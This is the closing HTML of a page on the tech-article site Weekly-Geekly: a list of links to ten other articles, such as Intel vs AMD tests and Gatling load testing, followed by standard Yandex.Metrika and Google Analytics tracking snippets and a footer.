<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../344804/index.html">Intel vs AMD: comparative tests</a></li>
<li><a href="../344808/index.html">Explanation of SNARKs. Mating elliptic curves (translation)</a></li>
<li><a href="../344810/index.html">Informatics Quick Reference Guide</a></li>
<li><a href="../344812/index.html">What was said about JavaScript in 1995</a></li>
<li><a href="../344814/index.html">Bezier and Picasso curves</a></li>
<li><a href="../344818/index.html">Load testing on the Gatling framework</a></li>
<li><a href="../344822/index.html">Dirty tricks and RAM</a></li>
<li><a href="../344824/index.html">Deep Learning with Spark and Hadoop: Meet Deeplearning4j</a></li>
<li><a href="../344826/index.html">Microkernel vs. monolith and the "triumph" of MINIX</a></li>
<li><a href="../344830/index.html">Quantum computing: annealing with switches and other fun</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>